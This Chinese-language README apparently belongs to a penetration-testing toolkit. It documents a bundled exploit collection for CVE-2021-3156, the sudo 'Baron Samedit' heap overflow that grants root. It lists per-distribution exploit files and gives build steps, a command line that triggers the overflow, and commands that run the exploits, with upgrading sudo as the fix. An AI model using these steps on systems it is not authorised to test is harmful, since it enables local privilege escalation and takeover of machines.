# 02sudo-samedit — CVE-2021-3156 sudo Baron Samedit

> sudo 命令行解析堆缓冲区溢出。`sudoedit -s` 历史模式下可构造 `\` 反斜杠触发堆溢出，未授权用户可获 root。影响范围覆盖 2011~2021 年所有 sudo 版本。

| 项 | 值 |
|---|---|
| CVE | CVE-2021-3156 |
| 漏洞类型 | 堆缓冲区溢出（heap overflow） |
| 影响版本 | sudo 1.8.2 ~ 1.8.31p2、1.9.0 ~ 1.9.5p1 |
| 公开时间 | 2021-01 |
| 官方上游 | [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) |
| 源码类型 | Python + C 混合 |

## 目录结构
| 文件 | 说明 |
|---|---|
| `CVE-2021-3156/exploit_nss.py` | 通用 NSS 方案（Ubuntu/Debian） |
| `CVE-2021-3156/exploit_nss_d9.py` | Debian 9 变体 |
| `CVE-2021-3156/exploit_nss_u14.py` | Ubuntu 14.04 变体 |
| `CVE-2021-3156/exploit_nss_u16.py` | Ubuntu 16.04 变体 |
| `CVE-2021-3156/exploit_defaults_mailer.py` | sudoers defaults mailer 方案 |
| `CVE-2021-3156/exploit_cent7_userspec.py` | CentOS 7 userspec 方案 |
| `CVE-2021-3156/exploit_userspec.py` | 通用 userspec 方案 |
| `CVE-2021-3156/exploit_timestamp_race.c` | timestamp 竞态方案（C） |
| `CVE-2021-3156/hax.c` | 主要 C 利用代码（blasty 上游） |
| `CVE-2021-3156/lib.c` | NSS 共享库利用 |
| `CVE-2021-3156/Makefile` | C 代码编译脚本 |

## 编译
```bash
# Python 方案无需编译
# C 方案需要编译（build.sh 会自动处理）
./build.sh <outdir> [gnu|musl]

# 或手动编译 C 代码
cd CVE-2021-3156
make
```

## 用法
```bash
# 先用 sudo 自身验证漏洞存在（应报错 "malloc(): uninitialized bytes"）
sudoedit -s '\' $(python3 -c "print('A'*1000)")

# Python 方案
python3 exploit_nss.py          # Ubuntu/Debian 通用
python3 exploit_cent7_userspec.py   # CentOS 7

# C 方案（需要先编译）
./sudo-hax-me-a-sandwich <target_number>
```

## 恢复/清理
- 升级 sudo 至 ≥1.9.5p2。

## 上游参考
- <https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit>
- [CVE 详情](https://nvd.nist.gov/vuln/detail/CVE-2021-3156)
